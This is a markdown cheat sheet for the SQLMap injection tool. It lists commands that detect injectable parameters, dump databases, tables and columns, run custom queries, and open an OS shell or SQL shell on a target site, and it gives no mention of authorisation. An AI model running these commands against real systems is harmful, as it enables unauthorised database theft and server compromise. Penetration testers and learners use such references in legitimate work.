# SQLMap💉

### Installation 

    sudo apt install sqlmap

### Automatic Analysis

    sqlmap -u “https://target.com/page/”

> Use this method to get basic info if that particular page is vulnerable or not, Note its not always reliable


### Specifying the GET Request Parameter

    sqlmap -u “https://target.com/page?para1=val1&para2=val2”

> Use this when you are sure that when the website accepts that particular parameter

### Asking SQL map to Check if particular parameter is exploitable

    “https://target_site.com/page?p1=value1&p2=value2” -p p1

> Here P1 is the first parameter and using that -p followed by p1 asks SQLmap to check that particular parameter alone.


### Specifying the POST Request Parameter

    sqlmap -u “https://target.com/page/” --data="p1=val1&p2=val2"

> This is very important since lot of web apps use POST request instead of GET request

### When a web app uses Authenticated Session With Cookie or Header

    sqlmap -u “https://target_site.com/page/” --data="p1=value1&p2=value2" --cookie="Session_Cookie_Value"

> Get the Cookie Session for the browser's developer tools in the application section


    sqlmap -u “https://target_site.com/page/” --data="p1=val1&p2=val2" --headers="<------>"

##  Once you success fully exploit there is session thats created by SQLmap which you can use for direct connection

    sqlmap -u “https://target.com/page?p1=value1" -s SESSION-FILE.sqlite --dbs

> You can use this file from the home path of the SQLMap tool’s output directory.


## Exploitation Commands

If the SQL injection vulnerability is observed **positive** then you can use the following commands to Exploit the SQL injection vulnerability.

### List the databases

    sqlmap -u “https://target_site.com/page?p1=value1” --dbs

### List Tables of a particular Database

    sqlmap -u “https://target_site.com/page?p1=value1” -D TARGET_DB --tables

### List Columns of Table of a Database 

    sqlmap -u “https://target_site.com/page?p1=value1” -D TARGET_DB -T TARGET_TABLE --columns

### Dump Specific Data of Columns of Table  of Database 

    sqlmap -u “https://target_site.com/page?p1=value1” -D TARGET_DB -T TARGET_TABLE -C "Col1,Col2" --dump

### Fully Dump Table TARGET_TABLE of Database TARGET_DB

    sqlmap -u “https://target_site.com/page?p1=value1” -D TARGET_DB -T TARGET_TABLE --dump

### Dump full Database

    sqlmap -u “https://target_site.com/page?p1=value1” -D TARGET_DB --dump

### Run Custom Query on your own

    sqlmap -u “https://target_site.com/page?p1=value1” --sql-query "SELECT * FROM TARGET_DB;"

### Get  access to OS Shell

    sqlmap -u “https://target_site.com/page?p1=value1” --os-shell

### Get access to SQL shell

    sqlmap -u “https://target_site.com/page?p1=value1” --sqlmap-shell



